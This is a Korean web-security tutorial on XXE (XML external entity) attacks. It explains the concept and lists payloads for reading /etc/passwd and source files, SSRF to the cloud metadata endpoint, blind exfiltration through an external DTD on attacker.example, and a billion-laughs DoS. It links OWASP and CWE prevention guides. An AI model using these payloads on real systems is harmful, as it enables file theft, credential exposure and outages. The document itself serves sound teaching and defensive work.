---
title: "XXE (XML 외부 개체)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, XXE]
tags: [xxe, xml, ssrf, web]
description: "외부 개체 처리가 켜진 XML 파서에 사용자 XML이 닿을 때 파일 읽기·SSRF·DoS로 이어지는 XXE의 개념과, 파일 탈취·블라인드·SSRF 구문을 정리합니다."
mermaid: true
---

> XXE는 XML 파서의 **외부 개체(external entity)** 처리 기능을 악용한다. 공격자가 정의한 개체를 파서가 해석하면 서버의 파일을 읽거나, 내부망에 요청을 보내거나(SSRF), 파서를 멈추게 한다.

## 개념

DTD에서 `<!ENTITY>`로 개체를 정의할 수 있고, `SYSTEM` 키워드로 외부 리소스를 가리키면 파서가 그 내용을 가져와 문서에 치환한다. 기본 설정으로 DTD·외부 개체를 허용하는 파서에 사용자 XML(업로드, SOAP, SVG, 문서 파일 등)이 닿으면 성립한다.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>   <!-- 파서가 /etc/passwd 를 읽어 &x; 자리에 치환 -->
```

XML을 직접 안 받아도 `.docx`·`.xlsx`·`.svg`·SAML 같은 **XML 기반 파일** 처리 지점이 통로가 된다.

## 공격·우회 구문

허가된 범위에서만.

### 파일 읽기 (in-band)

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
<!-- Windows: file:///c:/windows/win.ini -->
<!-- PHP 래퍼로 소스: php://filter/convert.base64-encode/resource=index.php -->
```

### SSRF (내부망·메타데이터)

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<r>&x;</r>
<!ENTITY x SYSTEM "http://127.0.0.1:8080/admin">
```

### 블라인드 XXE (대역 외, OAST)

응답에 결과가 안 나오면 외부 DTD로 데이터를 내 서버로 빼낸다.

```xml
<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd"> %ext;]>
<!-- evil.dtd: 파일 내용을 내 서버 URL 파라미터로 전송(파라미터 개체 체인) -->
```

### DoS (billion laughs)

```xml
<!ENTITY a "aaaa..."><!ENTITY b "&a;&a;&a;..."> ... 중첩 확장으로 메모리 폭증
```

### 확인·식별

```
Content-Type: application/xml / text/xml 받는 지점, 업로드 docx/svg
무해한 개체로 먼저 반영 여부 확인 → 파일/OAST 로 확대
코드: DocumentBuilderFactory/SAXParser/libxml 등이 DTD·external-general-entities 허용인지
```

## 참고 자료

- [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
